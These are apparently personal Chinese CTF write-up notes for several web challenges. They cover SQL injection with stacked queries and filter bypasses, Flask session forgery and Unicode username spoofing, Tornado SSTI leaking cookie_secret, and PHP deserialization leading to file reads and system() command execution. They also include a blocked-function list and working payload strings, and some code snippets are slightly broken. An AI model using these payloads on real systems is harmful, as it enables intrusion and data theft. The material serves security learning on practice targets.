#  [强网杯 2019]随便注
## 确认题型
题目是这样
一个sql注入
![[Pasted image 20251012134327.png]]
输入1回显如上
我们尝试
`1'or 1=1--+`
得到全部内容
基本可以确定是用单引号闭合
## 确认是否有过滤
我们直接union select发现有关键字过滤![[Pasted image 20251012134702.png]]
那select用不了。我们想到几种解决方式
1.使用concat拼接出来一个select
2.使用堆叠注入
3.进行十六进制编码


## 解题

### 1
我们先使用堆叠注入尝试一下
`1';show databases-- q`![[Pasted image 20251012135055.png]]

`1';show tables-- q`![[Pasted image 20251012135119.png]]

有两个表单我们直接看


看一下第一个表1919810931114514的表结构，有两种方式：

方式一：`1'; show columns from tableName;#`

方式二：`1';desc tableName;#`

注意，如果tableName是纯数字，需要用\`包裹，比如
```
1';describe `1919810931114514`;#
```

获取到字段名为flag：
![[Pasted image 20251012135506.png]]

找到flag字段了，我们现在使用刚才说的预编译直接拼接查询语句

```
1';PREPARE aaa from concat('s','elect', ' * from `1919810931114514` ');EXECUTE aaa;#

```
得到flag

### 2
由于sql查询语句是可以解析16进制编码的
所以我们可以想办法用16进制编码绕过字符串过滤

前几步和方法一一致，最后一步（第8步），我们可以直接将`` select * from `1919810931114514` ``语句进行16进制编码，即：`73656c656374202a2066726f6d20603139313938313039333131313435313460`，替换payload：

`1';PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#`

同时，我们也可以先定义一个变量并将sql语句初始化，然后调用

`1';Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#`

### 3
最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为`id`我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：``1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#`` ，然后通过`1' or 1 = 1 #`，成功获取到flag。 （关于更改表名的讲解请见下文）

### 4
此题还可以通过[handle](https://zhida.zhihu.com/search?content_id=209402995&content_type=Article&match_order=1&q=handle&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjA0MjAzOTYsInEiOiJoYW5kbGUiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMDk0MDI5OTUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.7cYMZkSfb3EPaDwmSYnjrC0ZmCkXFAeqmgzYAh9QkIk&zhida_source=entity)直接出答案：``1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;``

（关于的handle的讲解请见下文）


## 知识点讲解
###  1.预编译

预编译相当于定一个语句相同，参数不通的[Mysql](https://zhida.zhihu.com/search?content_id=209402995&content_type=Article&match_order=1&q=Mysql&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjA0MjAzOTYsInEiOiJNeXNxbCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjIwOTQwMjk5NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.c-7k-sxMWVICF1ztt4Oe5GnMPZ8CGMxXQKCY729zREo&zhida_source=entity)模板，我们可以通过预编译的方式，绕过特定的字符过滤

格式：

```text
PREPARE 名称 FROM 	Sql语句 ? ;
SET @x=xx;
EXECUTE 名称 USING @x;
```

举例：查询ID为1的用户：

```text
方法一：
SElECT * FROM t_user WHERE USER_ID = 1

方法二：
PREPARE jia FROM 'SElECT * FROM t_user WHERE USER_ID = 1';
EXECUTE jia;

方法三：
PREPARE jia FROM 'SELECT * FROM t_user WHERE USER_ID = ?';
SET @ID = 1;
EXECUTE jia USING @ID;

方法四：
SET @SQL='SElECT * FROM t_user WHERE USER_ID = 1';
PREPARE jia FROM @SQL;
EXECUTE jia;
```

### 2. 更改表名

- 修改表名：`ALTER TABLE 旧表名 RENAME TO 新表名；`
- 修改字段：`ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；`
- `eg:ALTER TABLE users CHANGE username name VARCHAR(50) NOT NULL;`


### 3.handle

- handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：

```text
打开表：
HANDLER 表名 OPEN ;

查看数据：
HANDLER 表名 READ next;

关闭表：
HANDLER 表名 READ CLOSE;
```


#### 基本语法

`HANDLER table_name OPEN; HANDLER table_name [READ | READ ...] [WHERE ...]; HANDLER table_name CLOSE;`

典型操作步骤：

1. **打开表**
    

`HANDLER mytable OPEN;`

2. **读取一行或多行**
    

`HANDLER mytable READ FIRST;      -- 读取第一行 HANDLER mytable READ NEXT;       -- 读取下一行 HANDLER mytable READ LAST;       -- 读取最后一行 HANDLER mytable READ PREV;       -- 读取上一行`

3. **关闭表**
    

`HANDLER mytable CLOSE;`

---

#### 3️⃣ 示例

假设有表 `users(id, username, password)`：

`-- 打开表 HANDLER users OPEN;  -- 读取第一行 HANDLER users READ FIRST;  -- 返回 id=1, username=alice ...  -- 读取下一行 HANDLER users READ NEXT;   -- 返回下一行  -- 关闭表 HANDLER users CLOSE;`

你可以用 `WHERE` 结合索引列来定位行（仅支持索引列）：

`HANDLER users READ index_name WHERE id=10;`

**注意：handle一定要有打开，查询，关闭的三步操作**





#  BUUCTF-[HCTF 2018]admin1

## 方法一 flask session 伪造

我们先注册一个用户
看到身份验证是由一个session来决定的

我们在更改密码的源代码处可以找到源代码的github库
于是我们可以在config.py里面发现密钥为ckj123

这样我们伪造一个flask session就可以

## 方法二 Unicode欺骗

注意在routes.py中 修改密码的这一段代码
![[Pasted image 20251013222150.png]]
将输入的username交给了nodeprep.prepare函数处理，看看这个函数是什么

往上看，可以直到此函数在这个库中![[image-20210622114043329.avif]]
在这里可以看到版本的信息，这里是10版，而官网已经到了21.2.0，版本差距极大![[image-20210622141214771.avif]]

![[Pasted image 20251013222724.png]]


然后我们发现在使用nodeprep.prepare函数对于Modifier Letter Capital这些字母转换时过程如下：

![[Pasted image 20251013222742.png]]


```
ᴬᴰᴹᴵᴺ
使用一次nodeprep.prepare()
-> ADMIN 
再使用一次nodepre.prepare()
-> admin
```

首先我们注册ᴬᴰᴹᴵᴺ用户。然后用ᴬᴰᴹᴵᴺ用户登录；因为在登录时login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN

此时我们点change password修改密码，在修改时就会再一次调用了一次nodeprep.prepare函数将ADMIN转换为admin，这样我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。



#  [护网杯 2018]easy_tornado

这道题首先告诉我们三个路由，可以看到flag在哪，以及生成哈希值的组成方式由
secret_cookie +md5（filename）组成，于是我们只需要找到密钥即可


尝试去掉`filehash`访问

返回报错页面，![[Pasted image 20251014110229.png]]
回想起提示`render`函数和`tornado`，尝试传入`{{2*2}}`
已经明示渲染和框架，尝试ssti
![[Pasted image 20251014110307.png]]
## 获取cookie_secret

#### [](https://startluck.github.io/2025/08/05/easy-tornado/#Tornado%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93%E6%9C%BA%E5%88%B6 "Tornado模板渲染机制")Tornado模板渲染机制

Tornado的模板引擎在渲染时，会将双花括号`{{ }}`中的内容识别为`Python`表达式并执行：  
模板中的`{{变量名}}`会被替换为当前作用域中该变量的值。  
模板上下文默认包含`handler`对象，通过它可以访问请求相关的所有属性和方法。

#### [](https://startluck.github.io/2025/08/05/easy-tornado/#handler-settings%E7%9A%84%E7%89%B9%E6%AE%8A%E6%80%A7 "handler.settings的特殊性")handler.settings的特殊性

`handler.settings`是`RequestHandler`的一个属性，指向`Application.settings`（即`Tornado`应用的全局配置字典）。  
这个字典包含敏感信息，如：
```python
{
    "cookie_secret": "abc123",  # 用于加密Cookie的密钥
    "debug": False,            # 调试模式
    "static_path": "/static",  # 静态文件路径
    # 其他自定义配置...
}

```
### 漏洞触发条件

当用户输入被直接拼接到模板中且未经过滤时，攻击者可以注入模板语法：
```python
# 危险写法：用户输入msg直接拼接到模板
self.render("error.html", msg=user_input)

```
如果用户提交msg=`{{handler.settings}}`：  
1.模板引擎会解析`{{handler.settings}}`。  
2.从当前handler对象中获取settings属性。  
3.将整个配置字典渲染到页面中，导致信息泄露。
![[Pasted image 20251014110403.png]]
继续将其拼接得到哈希值
拿到flag



#  [网鼎杯 2020 青龙组]**AreUSerialz**


一道反序列化的题目
通过审计代码可以知道
有几个函数可供我们使用，还会检测字符串的长度。检测是否有不可见字符
我们思路很明确，通过里面的read函数读取flag
但是问问题是他的反序列化代码的属性为私有
私有属性序列化时会产生%00不可见字符


这里用到知识点为php版本大于7.1可以**可以使用其他访问权限反序列化私有属性filename**


当我们构造序列化代码的时候可以将私有属性改为public

这样我们通过伪协议读取flag.php即可。


# [网鼎杯 2018]Fakebook

![[Pasted image 20251014215929.png]]
源码

**注意到get方法里面存在`curl_exec()`,可能这道题为ssrf漏洞利用**

![[Pasted image 20251014215952.png]]
高危

**同时注意到isValidBlog()方法的正则匹配，判断出传入的blog参数值必须为url形式**

注册成功进行sql注入

**注意到data字段里面的数据为刚刚我们join的数据的序列化形式**

![[Pasted image 20251014220101.png]]



**好玩的来了，注意到源代码这边使用的是iframe**
![[Pasted image 20251014220117.png]]




**构造payload**
```sql
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

```


**查看源代码，发现base64编码字符串**
![[Pasted image 20251014220203.png]]






# [网鼎杯 2020 朱雀组]phpweb



抓包
题目猜测两个参数分别是函数名和参数

所以尝试file_get_contents(index.php)


发现ban掉了system（）
assart（）等函数
```php
 <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>

```

所以我们可以使用反序列化


```php
<?php
  class Test{
     var p="ls /";
     var func="system";
     }
     <?php
$a=new Test();
echo serialize($a);
?>

```
payload为

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}

```
这样我们就可以执行系统命令了

使用`find / -name flag*`

找到一个可疑文件

cat他即可

# [WUSTCTF2020]朴实无华

cat的替代品

### 📖 常见文件查看命令

- `cat`
    
    - 全称 _concatenate_，最直接的文件查看命令。
        
    - 一次性把文件内容输出到标准输出。
        
    - 适合小文件。
        
- `more`
    
    - 分页显示文件内容。
        
    - 适合大文件，可以按空格翻页，`q` 退出。
        
- `less`
    
    - 比 `more` 更强大，可以前后翻页、搜索。
        
    - 常用来查看日志。
        
- `head`
    
    - 默认显示文件开头 10 行。
        
    - 可用 `-n` 指定行数，例如 `head -n 20 file.txt`。
        
- `tail`
    
    - 默认显示文件末尾 10 行。
        
    - 常用于实时监控日志：`tail -f file.log`。
        
- `sort`
    
    - 主要功能是对文件内容排序。
        
    - 虽然它会“读取”文件，但输出的是排序后的结果，而不是原始内容。